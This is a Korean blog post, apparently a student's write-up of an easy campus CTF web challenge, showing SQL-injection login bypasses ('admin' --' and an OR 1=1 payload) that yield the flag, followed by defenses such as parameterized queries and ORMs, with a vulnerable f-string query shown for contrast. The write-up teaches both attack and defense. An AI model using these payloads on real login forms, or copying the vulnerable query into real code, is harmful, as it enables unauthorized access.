---
slug: ctf-web-writeup
title: CTF 웹 해킹 문제 풀이 - SQL Injection 기초
authors: [haeun]
tags: [ctf, web-security]
---

교내 CTF 대회에서 출제된 웹 해킹 문제 풀이를 정리했다. SQL Injection 기초 문제.

<!-- truncate -->

## 문제 개요

- **카테고리**: Web
- **난이도**: Easy
- **설명**: "관리자 페이지에 접속하세요"
- 로그인 폼이 하나 주어짐

## 풀이 과정

### 1단계: 입력값 테스트

먼저 로그인 폼에 일반적인 입력을 넣어봤다.

```
ID: admin
PW: admin
→ "로그인 실패"
```

### 2단계: SQL Injection 시도

서버가 입력값을 그대로 SQL 쿼리에 넣는지 확인.

```
ID: admin' --
PW: (아무거나)
```

서버 측 쿼리가 이런 형태라면:

```sql
SELECT * FROM users WHERE id = 'admin' --' AND pw = '아무거나'
```

`--` 이후는 주석 처리되어 비밀번호 검증을 우회할 수 있다.

### 3단계: 결과

```
ID: admin' --
PW: x
→ "Welcome, admin! FLAG{sql_1nj3ct10n_b4s1c}"
```

성공! 플래그 획득.

### 4단계: 다른 방법 - OR 기반

```
ID: ' OR 1=1 --
PW: x
```

이 경우 쿼리가:

```sql
SELECT * FROM users WHERE id = '' OR 1=1 --' AND pw = 'x'
```

`1=1`은 항상 참이므로 첫 번째 사용자(보통 admin)로 로그인됨.

## SQL Injection 방어 방법

### 1. Prepared Statement (매개변수화 쿼리)

```python
# 취약한 코드
cursor.execute(f"SELECT * FROM users WHERE id = '{user_id}'")

# 안전한 코드
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### 2. ORM 사용

```python
# SQLAlchemy (Python)
user = User.query.filter_by(id=user_id).first()
```

### 3. 입력값 검증

특수문자(`'`, `"`, `;`, `--`) 필터링. 하지만 이것만으로는 부족하고, Prepared Statement와 병행해야 한다.

## 배운 점

- SQL Injection은 가장 기본적이지만 여전히 위험한 공격
- OWASP Top 10에서 항상 상위권
- 방어의 핵심은 **사용자 입력을 쿼리에 직접 넣지 않는 것**
- CTF 문제를 통해 공격자 시점에서 생각하는 연습이 중요
